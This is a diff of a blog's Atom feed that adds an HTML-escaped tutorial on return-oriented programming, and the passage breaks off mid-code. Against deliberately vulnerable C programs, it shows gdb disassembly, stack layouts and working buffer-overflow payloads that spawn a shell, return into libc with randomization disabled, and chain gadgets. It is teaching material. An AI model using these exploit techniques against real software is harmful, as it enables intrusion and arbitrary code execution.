@@ -1,5 +1,655 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-05-18T00:00:00-07:00</updated><entry><title>Achieving maximum memory bandwidth</title><link href="http://codearcana.com/posts/2013/05/18/achieving-maximum-memory-bandwidth.html" rel="alternate"></link><updated>2013-05-18T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-18:posts/2013/05/18/achieving-maximum-memory-bandwidth.html</id><summary type="html">&lt;p&gt;These past few months I was a teaching assistant for a class on &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/"&gt;parallel computer architecture&lt;/a&gt;. One of the questions on our first homework assignment asked the students to analyze a function and realize that it could not be optimized any further because it was already at maximum memory bandwidth. But a student pointed out, rightly, that it was only at &lt;em&gt;half&lt;/em&gt; the maximum bandwidth. In an attempt to understand what was going on, I embarked on a quest to write a program that achieved the theoretical maximum memory bandwidth.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-05-28T00:00:00-07:00</updated><entry><title>Introduction to return oriented programming (ROP)</title><link href="http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html" rel="alternate"></link><updated>2013-05-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-28:posts/2013/05/28/introduction-to-return-oriented-programming-rop.html</id><summary type="html">&lt;h1&gt;What is ROP?&lt;/h1&gt;
+&lt;p&gt;Return Oriented Programming (ROP) is a powerful technique used to counter common exploit prevention strategies. In particular, ROP is useful for circumventing Address Space Layout Randomization (ASLR)&lt;sup id="fnref:1"&gt;&lt;a class="footnote-ref" href="#fn:1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt; and DEP&lt;sup id="fnref:2"&gt;&lt;a class="footnote-ref" href="#fn:2" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt;. When using ROP, an attacker uses his/her control over the stack right before the return from a function to direct code execution to some other location in the program. Except on very hardened binaries, attackers can easily find a portion of code that is located in a fixed location (circumventing ASLR) and which is executable (circumventing DEP). Furthermore, it is relatively straightforward to chain several payloads to achieve (almost) arbitrary code execution. &lt;/p&gt;
+&lt;h1&gt;Before we begin&lt;/h1&gt;
+&lt;p&gt;If you are attempting to follow along with this tutorial, it might be helpful
+to have a Linux machine you can compile and run 32 bit code on. If you install
+the correct libraries, you can compile 32 bit code on a 64 bit machine with the
+&lt;code&gt;-m32&lt;/code&gt; flag via &lt;code&gt;gcc -m32 hello_world.c&lt;/code&gt;. I will target this tutorial mostly at
+32 bit programs because ROP on 64 bit follows the same principles, but is just
+slightly more technically challenging. For the purpose of this tutorial, I will
+assume that you are familiar with x86 C calling conventions and stack
+management. I will attempt to provide a brief explanation
+&lt;a href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html"&gt;here&lt;/a&gt;, but you are encouraged to explore in more depth on your own.&lt;/p&gt;
+&lt;h1&gt;My first ROP&lt;/h1&gt;
+&lt;p&gt;The first thing we will do is use ROP to call a function in a very simple binary. In particular, we will be attempting to call &lt;code&gt;not_called&lt;/code&gt; in the following program&lt;sup id="fnref:3"&gt;&lt;a class="footnote-ref" href="#fn:3" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;not_called&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Enjoy your shell!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We disassemble the program to learn the information we will need in order to exploit it: the size of the buffer and the address of &lt;code&gt;not_called&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
+&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) disas vulnerable_function &lt;/span&gt;
+&lt;span class="go"&gt;Dump of assembler code for function vulnerable_function:&lt;/span&gt;
+&lt;span class="go"&gt;   0x08048464 &amp;lt;+0&amp;gt;:  push   %ebp&lt;/span&gt;
+&lt;span class="go"&gt;   0x08048465 &amp;lt;+1&amp;gt;:  mov    %esp,%ebp&lt;/span&gt;
+&lt;span class="go"&gt;   0x08048467 &amp;lt;+3&amp;gt;:  sub    $0x88,%esp&lt;/span&gt;
+&lt;span class="go"&gt;   0x0804846d &amp;lt;+9&amp;gt;:  mov    0x8(%ebp),%eax&lt;/span&gt;
+&lt;span class="go"&gt;   0x08048470 &amp;lt;+12&amp;gt;: mov    %eax,0x4(%esp)&lt;/span&gt;
+&lt;span class="go"&gt;   0x08048474 &amp;lt;+16&amp;gt;: lea    -0x6c(%ebp),%eax&lt;/span&gt;
+&lt;span class="go"&gt;   0x08048477 &amp;lt;+19&amp;gt;: mov    %eax,(%esp)&lt;/span&gt;
+&lt;span class="go"&gt;   0x0804847a &amp;lt;+22&amp;gt;: call   0x8048340 &amp;lt;strcpy@plt&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;   0x0804847f &amp;lt;+27&amp;gt;: leave  &lt;/span&gt;
+&lt;span class="go"&gt;   0x08048480 &amp;lt;+28&amp;gt;: ret   &lt;/span&gt;
+&lt;span class="go"&gt;End of assembler dump.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) print not_called&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x8048444 &amp;lt;not_called&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We see that &lt;code&gt;not_called&lt;/code&gt; is at &lt;code&gt;0x8048444&lt;/code&gt; and the buffer &lt;code&gt;0x6c&lt;/code&gt; bytes long. Right before the call to &lt;code&gt;strcpy@plt&lt;/code&gt;, the stack in fact looks like:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;argument&amp;gt;          |
+| &amp;lt;return address&amp;gt;    |
+| &amp;lt;old %ebp&amp;gt;          | &amp;lt;= %ebp
+| &amp;lt;0x6c bytes of      |
+|       ...           |
+|       buffer&amp;gt;       |
+| &amp;lt;argument&amp;gt;          |
+| &amp;lt;address of buffer&amp;gt; | &amp;lt;= %esp
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Since we want our payload to overwrite the return address, we provide 0x6c bytes to fill the buffer, 4 bytes to replace the old &lt;code&gt;%ebp&lt;/code&gt;, and the target address (in this case, the address of &lt;code&gt;not_called&lt;/code&gt;). Our payload looks like:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| 0x8048444 &amp;lt;not_called&amp;gt;     |
+| 0x42424242 &amp;lt;fake old %ebp&amp;gt; |
+| 0x41414141 ...             |
+|   ... (0x6c bytes of &amp;#39;A&amp;#39;s) |
+|   ... 0x41414141           |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We try this and we get our shell&lt;sup id="fnref:4"&gt;&lt;a class="footnote-ref" href="#fn:4" rel="footnote"&gt;4&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;*0x6c + &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot; + &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;44&lt;span class="se"&gt;\x&lt;/span&gt;84&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;Enjoy your shell!&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt; 
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Calling arguments&lt;/h1&gt;
+&lt;p&gt;Now that we can return to an arbitrary function, we want to be able to pass arbitrary arguments. We will exploit this simple program&lt;sup id="fnref:3"&gt;&lt;a class="footnote-ref" href="#fn:3" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;not_used&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;not_called&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Not quite a shell...&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="n"&gt;strcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This time, we cannot simply return to &lt;code&gt;not_called&lt;/code&gt;. Instead, we want to call &lt;code&gt;system&lt;/code&gt; with the correct argument. First, we print out the values we need using &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
+&lt;!--
+[^6]: There are other ways to do this. `nm` is a popular choice for printing the symbols in a binary, but I don't know
+
+wzxhzdk:6
+
+--&gt;
+
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
+&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) pring &amp;#39;system@plt&amp;#39;&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x8048360 &amp;lt;system@plt&amp;gt;
+&lt;span class="go"&gt;(gdb) x/s not_used&lt;/span&gt;
+&lt;span class="go"&gt;0x8048580:   &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In order to call &lt;code&gt;system&lt;/code&gt; with the argument &lt;code&gt;not_used&lt;/code&gt;, we have to set up the stack. Recall, right after &lt;code&gt;system&lt;/code&gt; is called it expects the stack to look like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;argument&amp;gt;       |
+| &amp;lt;return address&amp;gt; |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We will construct our payload such that the stack looks like a call to &lt;code&gt;system(not_used)&lt;/code&gt; immediately after the return. We thus make our payload:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| 0x8048580 &amp;lt;not_used&amp;gt;             |
+| 0x43434343 &amp;lt;fake return address&amp;gt; |
+| 0x8048360 &amp;lt;address of system&amp;gt;    |
+| 0x42424242 &amp;lt;fake old %ebp&amp;gt;       |
+| 0x41414141 ...                   |
+|   ... (0x6c bytes of &amp;#39;A&amp;#39;s)       |
+|   ... 0x41414141                 |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We try this and get out shell:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;*0x6c + &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot; + &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;60&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="s2"&gt;&amp;quot; + &amp;quot;&lt;/span&gt;CCCC&lt;span class="s2"&gt;&amp;quot; + &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;80&lt;span class="se"&gt;\x&lt;/span&gt;85&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Return to &lt;code&gt;libc&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;So far, we've only been looking at contrived binaries that contain the pieces we need for our exploit. Fortunately, ROP is still fairly straightforward without this handicap. The trick is to realize that programs that use functions from a shared library, like &lt;code&gt;printf&lt;/code&gt; from &lt;code&gt;libc&lt;/code&gt;, will link &lt;em&gt;the entire library&lt;/em&gt; into their address space at run time. This means that even if they never call &lt;code&gt;system&lt;/code&gt;, the code for &lt;code&gt;system&lt;/code&gt; (and every other function in &lt;code&gt;libc&lt;/code&gt;) is accessible at runtime. We can see this fairly easy in &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -s unlimited
+&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
+&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) break main&lt;/span&gt;
+&lt;span class="go"&gt;Breakpoint 1 at 0x8048404&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) run&lt;/span&gt;
+&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;
+
+&lt;span class="go"&gt;Breakpoint 1, 0x08048404 in main ()&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) print system&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x555d2430 &amp;lt;system&amp;gt;
+&lt;span class="go"&gt;(gdb) find 0x555d2430, +999999999999, &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;0x556f3f18&lt;/span&gt;
+&lt;span class="go"&gt;warning: Unable to access target memory at 0x5573a420, halting search.&lt;/span&gt;
+&lt;span class="go"&gt;1 pattern found.&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This example illustrates several important tricks. First, the use of &lt;code&gt;ulimit -s unlimited&lt;/code&gt; which will disable library randomization on 32-bit programs. Next, we must run the program and break at main, after libraries are loaded, to print values in shared libraries (but after we do so, then even functions unused by the program are available to us). Last, the &lt;code&gt;libc&lt;/code&gt; library actually contains the string &lt;code&gt;/bin/sh&lt;/code&gt;, which we can find with &lt;code&gt;gdb&lt;/code&gt;&lt;sup id="fnref:7"&gt;&lt;a class="footnote-ref" href="#fn:7" rel="footnote"&gt;5&lt;/a&gt;&lt;/sup&gt; use for exploits!&lt;/p&gt;
+&lt;p&gt;It is fairly straightforward to plug both of these addresses into our previous exploit:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;*0x6c + &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot; + &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;30&lt;span class="se"&gt;\x&lt;/span&gt;24&lt;span class="se"&gt;\x&lt;/span&gt;5d&lt;span class="se"&gt;\x&lt;/span&gt;55&lt;span class="s2"&gt;&amp;quot; + &amp;quot;&lt;/span&gt;CCCC&lt;span class="s2"&gt;&amp;quot; + &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="se"&gt;\x&lt;/span&gt;3f&lt;span class="se"&gt;\x&lt;/span&gt;6f&lt;span class="se"&gt;\x&lt;/span&gt;55&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Chaining gadgets&lt;/h1&gt;
+&lt;p&gt;With ROP, it is possible to do far more powerful things than calling a single function. In fact, we can use it to run arbitrary code&lt;sup id="fnref:8"&gt;&lt;a class="footnote-ref" href="#fn:8" rel="footnote"&gt;6&lt;/a&gt;&lt;/sup&gt; rather than just calling functions we have available to us. We do this by returning to &lt;em&gt;gadgets&lt;/em&gt;, which are short sequences of instructions ending in a &lt;code&gt;ret&lt;/code&gt;. For example, the following pair of gadgets can be used to write an arbitrary value to an arbitrary location: &lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;
+&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;
+&lt;span class="nf"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ecx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nf"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;These work by &lt;code&gt;pop&lt;/code&gt;ing values from the stack (which we control) into registers and then executing code that uses them. To use, we set up the stack like so:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;| &amp;lt;address of mov %eax, (%ecx)&amp;gt;                  |
+| &amp;lt;value to write&amp;gt;                               |
+| &amp;lt;address to write to&amp;gt;                          |
+| &amp;lt;address of pop %ecx; pop %edx; pop %eax; ret&amp;gt; |
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You'll see that the first gadget returns to the second gadget, continuing the chain of attacker controlled code execution (this next gadget can continue).&lt;/p&gt;
+&lt;p&gt;Other useful gadgets include &lt;code&gt;xchg %eax, %esp&lt;/code&gt;, &lt;code&gt;sub %eax,%esp&lt;/code&gt;, and &lt;code&gt;add    $0x1c,%esp&lt;/code&gt;, which can be used to modify the stack pointer and &lt;em&gt;pivot&lt;/em&gt; it to a attacker controlled buffer. This is useful if the original vulnerability only gave control over &lt;code&gt;%eip&lt;/code&gt; (like in a &lt;a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html"&gt;format string vulnerability&lt;/a&gt;) or if the attacker does not control very much of the stack (as would be the case for a short buffer overflow).&lt;/p&gt;
+&lt;h1&gt;Chaining functions&lt;/h1&gt;
+&lt;p&gt;We can also use ROP to chain function calls: rather than a dummy return address, we use a &lt;code&gt;pop; ret&lt;/code&gt; gadget to move the stack above the arguments to the first function. Since we are just using the &lt;code&gt;pop; ret&lt;/code&gt; gadget to adjust the stack, we don't care what register it pops into (the value will be ignored anyways). As an example, we'll exploit the following binary&lt;sup id="fnref:3"&gt;&lt;a class="footnote-ref" href="#fn:3" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;exec_string&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;add_bin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;magic&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;strcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;add_sh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;magic2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;magic1&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0xcafebabe&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;magic2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0x0badf00d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;strcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;vulnerable_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
